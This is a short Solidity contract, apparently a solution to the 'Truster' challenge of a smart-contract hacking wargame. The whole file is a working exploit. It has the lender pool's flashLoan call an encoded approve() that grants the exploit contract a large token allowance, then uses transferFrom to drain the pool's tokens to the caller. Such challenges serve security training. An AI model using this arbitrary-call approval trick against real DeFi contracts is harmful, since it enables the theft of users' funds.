// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

pragma solidity ^0.8.0;

contract TrusterExploit {
    TrusterLenderPool public lenderPool;
    IERC20 public token;

    constructor(address _lenderPool, address _token){
        lenderPool = TrusterLenderPool(_lenderPool);
        token = IERC20(_token);
    }
    // 1000000 000000000000000000
    uint256 allowAmount = 1000000000000000000000000;

    function exploit() external {
        bytes memory data = abi.encodeWithSignature(
               "approve(address,uint256)", address(this),allowAmount
        );
        lenderPool.flashLoan(0,msg.sender,address(token),data);
        token.transferFrom(address(lenderPool),msg.sender,allowAmount);

    }
}